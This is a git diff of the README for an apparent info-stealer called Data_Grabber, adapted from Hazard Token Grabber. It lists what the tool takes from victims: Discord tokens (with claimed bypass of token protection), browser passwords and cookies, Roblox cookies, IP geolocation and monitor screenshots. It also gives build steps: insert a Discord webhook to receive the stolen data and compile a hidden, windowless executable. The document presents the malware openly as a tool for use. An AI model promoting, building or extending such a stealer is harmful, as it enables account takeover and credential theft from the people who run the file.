@@ -6,27 +6,35 @@ Stole code from [Rdimo](https://github.com/Rdimo/Hazard-Token-Grabber-V2) and mo
 - IP & Geolocation. (Country, City, Google Maps Location)
 - A screenshot of all their monitors
 - Roblox Cookies
-- All valid/working discord tokens. (Bypasses BetterDiscord, Token Protector and Discord's new encryption)
+- All valid/working discord tokens. (Bypasses BetterDiscord, Token Protector and Discord's token encryption)
 - All Passwords and Cookies from browsers (checks all profiles) in .txt format, that named bellow
 
-| Supported browsers  |
-| ------------- |
-| Opera |
-| Opera GX |
-| Vivaldi |
-| Chrome |
-| Microsoft Edge |
-| Uran |
-| Yandex |
-| Brave |
-| Iridium |
-| Firefox |
-| & more |
+| Supported browsers  | Is checked |
+| ------------- | ------------- |
+| Opera | Not checked ❌ |
+| Opera GX | Checked ✅ |
+| Amigo | Not checked ❌ |
+| Torch | Not checked ❌ |
+| Kometa | Not checked ❌ |
+| Orbitum | Not checked ❌ |
+| CentBrowser | Not checked ❌ |
+| 7Star | Not checked ❌ |
+| Sputnik | Not checked ❌ |
+| Vivaldi | Not checked ❌ |
+| Chrome SxS | Not checked ❌ |
+| Chrome | Checked ✅ |
+| Epic Privacy Browser | Not checked ❌ |
+| Microsoft Edge | Not checked ❌ |
+| Uran | Not checked ❌ |
+| Yandex | Not checked ❌ |
+| Brave | Checked ✅ |
+| Iridium | Not checked ❌ |
+| Firefox | Checked ✅ |
 
 ## Compile
 1. Before doing everything, replace text 'WEBHOOK_HERE' (line 35) with your discord webhook.
-2. Install modules if needed.
+Recommended to use [Rdimo webhook protector](https://github.com/Rdimo/Discord-Webhook-Protector) and change line 35 and 37.
+2. Install missing modules if you have some.
 3. On the same directory as python file open command prompt and type:
 >pyinstaller --clean --onefile --noconsole -i NONE Data_Grabber.py
-
 # CREDITS TO [Rdimo](https://github.com/Rdimo/Hazard-Token-Grabber-V2)
